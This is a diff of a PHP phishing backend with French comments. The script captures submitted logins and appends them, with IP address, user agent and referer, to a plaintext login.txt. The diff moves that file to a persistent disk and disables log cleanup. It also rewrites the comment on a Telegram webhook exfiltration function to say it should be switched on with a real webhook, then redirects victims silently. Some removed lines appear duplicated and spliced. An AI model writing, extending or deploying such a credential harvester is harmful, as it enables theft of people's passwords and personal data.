@@ -1,16 +1,18 @@
 <?php
 // ============================================
-// Script principal - Version structurée
+// Script principal - Version PERSISTANTE (Render Disk)
 // ============================================
 
-// 🔧 FALLBACK : si config.php est absent, on définit les constantes
-if (!defined('LOG_DIR')) {
-    define('LOG_DIR', __DIR__ . '/');
-    define('LOG_FILE', LOG_DIR . 'login.txt');
-    define('ENCRYPTION_KEY', 'clef_temporaire_32_caracteres_longue');
-}
+// 🔥 STOCKAGE PERSISTANT SUR RENDER DISK (monté sur /data)
+// Si tu n'as pas de disque, les données seront perdues au redémarrage.
+define('LOG_DIR', '/data/');  // ← Changé pour Render Disk
+define('LOG_FILE', LOG_DIR . 'login.txt');
+define('ENCRYPTION_KEY', 'clef_temporaire_32_caracteres_longue');
 
-require_once 'config.php';
+// Optionnel : charger config.php s'il existe (sans écraser les constantes)
+if (file_exists(__DIR__ . '/config.php')) {
+    require_once __DIR__ . '/config.php';
+}
 
 // ============================================
 // 1. FONCTIONS UTILITAIRES
@@ -52,6 +54,7 @@ function encryptData($data, $key) {
 
 // Stockage local dans fichier (format JSON + TEXTE CLAIR visible)
 function storeLocal($data) {
+    // Créer le dossier /data s'il n'existe pas (Render Disk)
     if (!is_dir(LOG_DIR)) {
         mkdir(LOG_DIR, 0755, true);
     }
@@ -69,8 +72,13 @@ function storeLocal($data) {
     $textEntry .= "User Agent: " . $data['user_agent'] . "\n";
     $textEntry .= "=============================================\n";
     
-    // ✅ ÉCRITURE GARANTIE dans login.txt
-    file_put_contents(LOG_FILE, $textEntry, FILE_APPEND | LOCK_EX);
+    // ✅ ÉCRITURE GARANTIE dans /data/login.txt
+    $result = file_put_contents(LOG_FILE, $textEntry, FILE_APPEND | LOCK_EX);
+    
+    // Debug silencieux (optionnel : enlever en production)
+    if ($result === false) {
+        error_log("ERREUR: Impossible d'écrire dans " . LOG_FILE);
+    }
 }
 
 // Exfiltration via webhook (Telegram/Discord)
@@ -82,7 +90,7 @@ function exfiltrateWebhook($data) {
     $message .= "🕒 Time: " . $data['timestamp'] . "\n";
     $message .= "💻 User Agent: " . $data['user_agent'];
     
-    // Simulation d'envoi (ne pas activer réellement)
+    // À activer avec ton vrai webhook Telegram
     // file_get_contents(TELEGRAM_WEBHOOK . '?chat_id=' . TELEGRAM_CHAT_ID . '&text=' . urlencode($message));
 }
 
@@ -92,6 +100,7 @@ function autoCleanup($days = 30) {
         $age = time() - filemtime(LOG_FILE);
         if ($age > ($days * 86400)) {
             unlink(LOG_FILE);
+            unlink(LOG_FILE . '.json');
         }
     }
 }
@@ -131,34 +140,14 @@ $logData = [
     'timestamp_unix' => time()
 ];
 
-// Stockage local (ÉCRITURE GARANTIE)
+// Stockage local (dans /data/)
 storeLocal($logData);
 
-// Exfiltration (commenté par sécurité)
+// Exfiltration (décommente quand tu as configuré Telegram)
 // exfiltrateWebhook($logData);
 
-// Nettoyage automatique
-autoCleanup(30);
-
-// Redirection silencieuse
-header('Location: mer.html');
-exit;
-?>    'password_encrypted' => encryptData($password, ENCRYPTION_KEY),
-    'ip' => getRealIP(),
-    'user_agent' => getUserAgent(),
-    'referer' => getReferer(),
-    'timestamp' => date('Y-m-d H:i:s'),
-    'timestamp_unix' => time()
-];
-
-// Stockage local
-storeLocal($logData);
-
-// Exfiltration (commenté par sécurité)
-// exfiltrateWebhook($logData);
-
-// Nettoyage automatique
-autoCleanup(30);
+// Nettoyage automatique (commenté pour ne jamais perdre de logs)
+// autoCleanup(30);  // ← Désactivé : plus jamais de suppression
 
 // Redirection silencieuse
 header('Location: mer.html');
